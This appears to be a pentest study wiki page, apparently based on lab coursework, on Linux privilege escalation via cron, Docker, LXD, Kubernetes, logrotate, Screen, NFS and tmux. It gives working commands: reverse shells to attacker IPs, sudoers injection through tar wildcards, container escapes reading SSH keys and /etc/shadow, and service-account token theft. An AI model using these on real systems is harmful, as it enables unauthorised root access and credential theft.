---
tags: [attack, attack/privesc]
module: linux_privilege_escalation
last_updated: 2026-05-10
source_count: 9
---

# Linux Privilege Escalation — Service-Based Techniques

Container escapes, cron job abuse, logrotate exploitation, vulnerable services, NFS misconfigurations, and tmux session hijacking.

## Overview

Service-based privilege escalation exploits misconfigured or vulnerable services running on the host. These range from world-writable cron scripts (immediate wins) to complex container escape chains. The unifying theme is that a service with elevated privileges can be made to execute attacker-controlled code.

## Key Concepts / Techniques

### Cron Job Abuse

Cron jobs run scripts or commands on a schedule, often as root. Two primary attack paths:

1. **World-writable script**: The cron script is writable — append a reverse shell
2. **Wildcard injection**: The cron command uses `*` in a directory you control

**Finding cron targets:**

```bash
# Direct crontab inspection
cat /etc/crontab
ls -la /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.hourly/ /etc/cron.d/
crontab -l

# World-writable files (potential cron scripts)
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# Watch for cron execution without reading crontab
# Use pspy — see [[tools/pspy]]
./pspy64 -pf -i 1000
```

**Exploiting a world-writable cron script:**

```bash
# Identify the backup script runs as root every 3 minutes
ls -la /dmz-backups/backup.sh
# -rwxrwxrwx 1 root root ...

# Append a reverse shell to the script (preserve original function)
echo 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1' >> /dmz-backups/backup.sh

# Start listener
nc -lnvp 443
# Wait for the next cron execution
```

**Wildcard injection via tar (cron-based):**

If a cron job runs `tar -zcf /backup.tar.gz *` in a directory you control, create files with names that become `tar` command-line arguments:

```bash
# The cron job:
# */1 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *

# Create the payload script
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

# Create files named as tar flags
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1

# When tar runs with *, the filenames become arguments:
# tar ... --checkpoint=1 --checkpoint-action=exec=sh root.sh ...
# This executes root.sh as root

# Verify once the cron fires
sudo -l
```

### Docker Privilege Escalation

Docker group membership or a writable Docker socket enables full host compromise.

**Via Docker group:**

```bash
id  # confirm docker group membership

# Mount host filesystem into privileged container
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
# Now running as root with full host filesystem access

# Alternative: extract root SSH key
docker run -v /root:/mnt -it ubuntu
cat /mnt/.ssh/id_rsa
```

**Via writable Docker socket:**

The Docker socket is usually at `/var/run/docker.sock`. If it's group-writable and you're in that group, or world-writable:

```bash
# Confirm socket permissions
ls -la /var/run/docker.sock

# Use docker binary with socket path
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

**Via mounted socket inside a container:**

If you're already inside a container and find a `docker.sock` file:

```bash
# Inside container, find the socket
ls -la /app/docker.sock

# Download docker binary if not present
wget https://<attacker>:443/docker -O /tmp/docker
chmod +x /tmp/docker

# Enumerate running containers
/tmp/docker -H unix:///app/docker.sock ps

# Create a new privileged container mounting host root
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged \
  -v /:/hostsystem main_app

# Execute shell in the new container
/tmp/docker -H unix:///app/docker.sock exec -it <container_id> /bin/bash

# Access host filesystem at /hostsystem
cat /hostsystem/root/.ssh/id_rsa
```

**Via Docker shared directories:**

When inside a container, look for non-standard mounted paths that expose the host filesystem:

```bash
ls /hostsystem/home/<user>/.ssh/
cat /hostsystem/home/<user>/.ssh/id_rsa
```

### LXD / LXC Container Escape

Membership in the `lxd` group allows creating privileged containers that mount the host filesystem.

```bash
# Confirm group membership
id  # look for: 116(lxd)

# Transfer Alpine image to target (or use existing template)
# unzip alpine.zip if compressed

# Import the image
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

# Create a privileged container (security.privileged=true disables UID mapping)
lxc init alpine r00t -c security.privileged=true

# Mount the host filesystem into the container
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

# Start and exec into the container
lxc start r00t
lxc exec r00t /bin/sh

# Inside container — full host filesystem access as root
ls /mnt/root/root/
cat /mnt/root/etc/shadow
```

**Alternative with existing template:**

```bash
# Import existing template
lxc image import ubuntu-template.tar.xz --alias ubuntuntemp

# Initialize with privileged flag
lxc init ubuntuntemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
```

### Kubernetes (K8s) Privilege Escalation

In environments with Kubernetes, an accessible Kubelet API or misconfigured RBAC can lead to node compromise.

**Architecture to know:**

| Port | Service |
|---|---|
| 6443 | API server (requires auth) |
| 10250 | Kubelet API (may allow anonymous) |
| 10255 | Read-only Kubelet API |

**Enumeration:**

```bash
# Test API server (expect 403 if anonymous access is restricted)
curl https://<node>:6443 -k

# Extract pod list from Kubelet (may work anonymously)
curl https://<node>:10250/pods -k | jq .

# Use kubeletctl for cleaner output
kubeletctl -i --server <node> pods

# Find pods vulnerable to RCE
kubeletctl -i --server <node> scan rce

# Execute commands in a pod
kubeletctl -i --server <node> exec "id" -p nginx -c nginx
```

**Privilege escalation via pod creation:**

If you have a service account token with `create pods` rights, create a pod that mounts the host filesystem:

```bash
# Extract token and certificate from a running pod
kubeletctl -i --server <node> exec \
  "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
  -p nginx -c nginx | tee k8.token

kubeletctl --server <node> exec \
  "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" \
  -p nginx -c nginx | tee ca.crt

# Check what the token can do
export token=$(cat k8.token)
kubectl --token=$token --certificate-authority=ca.crt \
  --server=https://<node>:6443 auth can-i --list

# Create a pod that mounts host /
# privesc.yaml:
# apiVersion: v1
# kind: Pod
# metadata:
#   name: privesc
#   namespace: default
# spec:
#   containers:
#   - name: privesc
#     image: nginx:1.14.2
#     volumeMounts:
#     - mountPath: /root
#       name: mount-root-into-mnt
#   volumes:
#   - name: mount-root-into-mnt
#     hostPath:
#       path: /
#   automountServiceAccountToken: true
#   hostNetwork: true

kubectl --token=$token --certificate-authority=ca.crt \
  --server=https://<node>:6443 apply -f privesc.yaml

# Read root SSH key from the privesc pod
kubeletctl --server <node> exec \
  "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

### Logrotate Exploitation (logrotten)

Logrotate manages log file rotation and runs as root via cron. Vulnerable versions can be exploited to write arbitrary files or execute code as root.

**Vulnerable versions:** 3.8.6, 3.11.0, 3.15.0, 3.18.0

**Requirements:**
1. Write permission to a log file that logrotate manages
2. Logrotate runs as root
3. Vulnerable logrotate version

```bash
# Clone and compile logrotten
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten

# Create reverse shell payload
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload

# Check which logrotate option is in use (create or compress)
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
# Output: create

# Start listener
nc -nlvp 9001

# Run the exploit (targeting a log file you can write to)
./logrotten -p ./payload /tmp/tmp.log
# Receive root shell
```

### Vulnerable Services

**Screen 4.5.0 (CVE-2017-5618):**

GNU Screen version 4.5.0 has a SUID binary that allows creating/writing files as root due to missing permission checks on log files.

```bash
# Check screen version
screen -v
# Screen version 4.05.00 (GNU) 10-Dec-16

# Use the public exploit script
./screen_exploit.sh
# Results in root shell
```

The exploit works by abusing `screen`'s log file creation to overwrite `/etc/ld.so.preload` with a malicious shared library path.

### Miscellaneous Techniques

**Weak NFS Privileges (`no_root_squash`):**

If an NFS export has `no_root_squash`, a root user on the attack host can create SUID binaries that execute as root on the target:

```bash
# On attack host — check NFS exports
showmount -e <target>

# Check /etc/exports on target for no_root_squash
cat /etc/exports
# /var/nfs/general *(rw,no_root_squash)
# /tmp *(rw,no_root_squash)

# On attack host (as root): create a SUID shell binary
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void) { setuid(0); setgid(0); system("/bin/bash"); }
EOF
gcc /tmp/shell.c -o /tmp/shell

# Mount the NFS share and copy the SUID binary
sudo mount -t nfs <target>:/tmp /mnt
cp /tmp/shell /mnt/
chmod u+s /mnt/shell

# On the target (as low-privileged user):
/tmp/shell   # executes as root
```

**Passive Traffic Capture:**

If `tcpdump` is installed and accessible, capture cleartext credentials from the network:

```bash
tcpdump -i any -w /tmp/capture.pcap
# Analyze for cleartext protocols: HTTP, FTP, SMTP, IMAP, telnet
```

Tools like `net-creds` and `PCredz` can extract credentials from pcap files automatically.

**Tmux Session Hijacking:**

If a privileged user has left a `tmux` session running with world-accessible socket:

```bash
# Find running tmux processes
ps aux | grep tmux
# root 4806 ... tmux -S /shareds new -s debugsess

# Check socket permissions
ls -la /shareds
# srw-rw---- 1 root devs 0 ...

# If you're in the devs group, attach to the session
tmux -S /shareds
# Now in root's tmux session
id   # uid=0(root)
```

## Flags & Options

| Command | Flag | Purpose |
|---|---|---|
| `pspy64` | `-pf -i 1000` | Print processes and FS events, scan every 1s |
| `docker run` | `-v /:/mnt` | Mount host root into container at /mnt |
| `docker run` | `--privileged` | Full device/capability access |
| `lxc init` | `-c security.privileged=true` | Disable UID mapping (container runs as real root) |
| `lxc config device add` | `recursive=true` | Mount directory recursively |
| `kubectl auth` | `can-i --list` | List all allowed K8s actions |
| `logrotten` | `-p <payload>` | Specify payload file |
| `showmount` | `-e <host>` | List NFS exports |

## Gotchas & Notes

- Wildcard injection requires the cron job to use `*` in a directory you can write files to — filenames starting with `-` or `--` become options
- Docker socket write access is functionally equivalent to root on the host — check `/var/run/docker.sock` permissions
- LXD group membership requires `lxd init` to have been run (sets up storage) — use `lxd init` with defaults if not initialized
- K8s privilege escalation depends heavily on the service account's RBAC permissions — `auth can-i --list` is the key enumeration step
- Logrotate exploit creates a race condition — may need multiple attempts
- NFS `no_root_squash` requires root on the attack host to exploit; it's commonly combined with an existing root shell elsewhere in the network
- Screen 4.5.0 exploit overwrites `/etc/ld.so.preload` — leaves artifacts; clean up after engagement

## Related Pages

- [[attack/linux_privilege_escalation]]
- [[attack/linux_privesc_enumeration]]
- [[attack/linux_privesc_sudo_suid]]
- [[attack/linux_privesc_kernel]]
- [[tools/pspy]]
- [[tools/linpeas]]

## Sources

- raw/linux_privilege_escalation/service_based_privilege_escalation_cron_job_abuse.md
- raw/linux_privilege_escalation/service_based_privilege_escalation_docker.md
- raw/linux_privilege_escalation/service_based_privilege_escalation_kibernetes.md
- raw/linux_privilege_escalation/service_based_privilege_escalation_logrotate.md
- raw/linux_privilege_escalation/service_based_privilege_escalation_lxd.md
- raw/linux_privilege_escalation/service_based_privilege_escalation_miscellaneous_techniques.md
- raw/linux_privilege_escalation/service_based_privilege_escalation_vulnerable_services.md
- raw/linux_privilege_escalation/environment_based_privalege_escalation_wildcard_abuse.md
- raw/linux_privilege_escalation/permission_based_privilege_escalation_privileged_groups.md
